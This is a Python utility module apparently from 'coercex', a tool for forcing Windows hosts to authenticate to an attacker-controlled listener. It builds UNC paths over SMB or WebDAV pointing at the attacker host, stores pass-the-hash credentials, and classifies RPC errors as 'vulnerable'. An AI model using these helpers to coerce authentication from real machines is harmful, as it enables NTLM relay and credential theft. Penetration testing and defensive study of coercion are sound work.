"""Utility functions for coercex."""

from __future__ import annotations

import random
import string
from dataclasses import dataclass, field
from enum import Enum, auto


def random_string(length: int = 8) -> str:
    """Generate a random alphanumeric string."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


class Transport(Enum):
    """UNC path transport type."""

    SMB = auto()
    HTTP = auto()  # WebDAV


class TriggerResult(Enum):
    """Result of a coercion trigger attempt."""

    VULNERABLE = (
        "vulnerable"  # Method triggered, callback received or error indicates it worked
    )
    ACCESSIBLE = "accessible"  # Method accessible but couldn't confirm coercion
    ACCESS_DENIED = "access_denied"  # Can't bind / access denied
    NOT_AVAILABLE = "not_available"  # Service/pipe not available
    CONNECT_ERROR = "connect_error"  # Can't connect to target
    UNKNOWN_ERROR = "unknown_error"  # Unexpected error
    TIMEOUT = "timeout"  # Connection timed out


@dataclass
class Credentials:
    """Authentication credentials."""

    username: str = ""
    password: str = ""
    domain: str = ""
    hashes: str = ""  # LMHASH:NTHASH
    aes_key: str = ""
    do_kerberos: bool = False
    dc_host: str = ""

    @property
    def lmhash(self) -> str:
        if self.hashes and ":" in self.hashes:
            return self.hashes.split(":")[0]
        return ""

    @property
    def nthash(self) -> str:
        if self.hashes and ":" in self.hashes:
            return self.hashes.split(":")[1]
        return ""


@dataclass
class ScanResult:
    """Result of scanning a single method on a single target."""

    target: str
    protocol: str
    method: str
    pipe: str
    uuid: str
    result: TriggerResult
    error: str = ""
    callback_received: bool = False
    source_ip: str = ""


@dataclass
class ScanStats:
    """Aggregate scan statistics."""

    total_targets: int = 0
    total_attempts: int = 0
    vulnerable: int = 0
    accessible: int = 0
    access_denied: int = 0
    not_available: int = 0
    connect_errors: int = 0
    timeouts: int = 0
    results: list[ScanResult] = field(default_factory=list)

    def add(self, result: ScanResult) -> None:
        self.results.append(result)
        self.total_attempts += 1
        match result.result:
            case TriggerResult.VULNERABLE:
                self.vulnerable += 1
            case TriggerResult.ACCESSIBLE:
                self.accessible += 1
            case TriggerResult.ACCESS_DENIED:
                self.access_denied += 1
            case TriggerResult.NOT_AVAILABLE:
                self.not_available += 1
            case TriggerResult.CONNECT_ERROR:
                self.connect_errors += 1
            case TriggerResult.TIMEOUT:
                self.timeouts += 1


def build_unc_path(
    listener: str,
    token: str,
    transport: Transport = Transport.SMB,
    port: int | None = None,
    path_style: str = "share",
) -> str:
    """Build a UNC path for coercion.

    Args:
        listener: Attacker IP/hostname.
        token: Unique correlation token.
        transport: SMB or HTTP (WebDAV).
        port: Listener port (used for WebDAV @port syntax).
        path_style: One of 'share', 'share_file', 'share_trailing', 'bare', 'unc_device'.

    Returns:
        UNC path string.
    """
    if transport == Transport.HTTP:
        # WebDAV format: \\host@port\path
        port_str = f"@{port}" if port else "@80"
        host = f"{listener}{port_str}"
    else:
        host = listener

    match path_style:
        case "share_file":
            return f"\\\\{host}\\{token}\\file.txt\x00"
        case "share_trailing":
            return f"\\\\{host}\\{token}\\\x00"
        case "share":
            return f"\\\\{host}\\{token}\x00"
        case "bare":
            return f"\\\\{host}\x00"
        case "unc_device":
            # \\?\UNC\host\share format used by MS-EVEN
            return f"\\??\\UNC\\{host}\\{token}\\aa"
        case _:
            return f"\\\\{host}\\{token}\x00"


# Well-known error codes that indicate the method is accessible/vulnerable
VULN_ERROR_CODES = {
    0x00000000,  # SUCCESS
    0x00000035,  # ERROR_BAD_NETPATH (tried to reach our UNC path)
    0x0000003A,  # ERROR_BAD_NET_NAME
    0x00000043,  # ERROR_BAD_NET_NAME
    0x000006D5,  # ERROR_BAD_NET_NAME variant
    0x00000057,  # ERROR_INVALID_PARAMETER (still processed the call)
    0x000006BA,  # RPC_S_SERVER_UNAVAILABLE (tried to call back)
    0x000006BE,  # RPC_S_CALL_FAILED
    0x000006BF,  # RPC_S_CALL_FAILED_DNE
}

ACCESS_DENIED_CODES = {
    0x00000005,  # ERROR_ACCESS_DENIED
    0x00000721,  # ERROR_ACCESS_DENIED variant
    0x000006AD,  # RPC_S_UNKNOWN_AUTHN_TYPE
}

NOT_AVAILABLE_CODES = {
    0x000006D9,  # EPT_S_NOT_REGISTERED
    0x000006E4,  # RPC_S_CANNOT_SUPPORT
}


def classify_error(error: Exception) -> TriggerResult:
    """Classify a DCERPC error into a TriggerResult."""
    err_str = str(error).lower()

    # Check for connection/timeout errors
    if any(s in err_str for s in ["timed out", "timeout", "connection refused"]):
        return TriggerResult.TIMEOUT
    if any(
        s in err_str for s in ["connection reset", "connection aborted", "broken pipe"]
    ):
        return TriggerResult.CONNECT_ERROR

    # Try to extract error code
    try:
        from impacket.dcerpc.v5.rpcrt import DCERPCException

        if isinstance(error, DCERPCException):
            code = error.error_code & 0xFFFFFFFF
            if code in VULN_ERROR_CODES:
                return TriggerResult.VULNERABLE
            if code in ACCESS_DENIED_CODES:
                return TriggerResult.ACCESS_DENIED
            if code in NOT_AVAILABLE_CODES:
                return TriggerResult.NOT_AVAILABLE
    except ImportError:
        pass

    # STATUS_PIPE_DISCONNECTED or similar = patched/not available
    if "status_pipe_disconnected" in err_str or "pipe_disconnected" in err_str:
        return TriggerResult.NOT_AVAILABLE

    # Access denied patterns
    if "access_denied" in err_str or "access denied" in err_str:
        return TriggerResult.ACCESS_DENIED

    # Bad netpath = vulnerable (it tried to reach our UNC path)
    if (
        "bad_netpath" in err_str
        or "bad_net_name" in err_str
        or "bad netpath" in err_str
    ):
        return TriggerResult.VULNERABLE

    # If the error message contains object_name_not_found, it processed the path
    if "object_name_not_found" in err_str:
        return TriggerResult.VULNERABLE

    return TriggerResult.UNKNOWN_ERROR
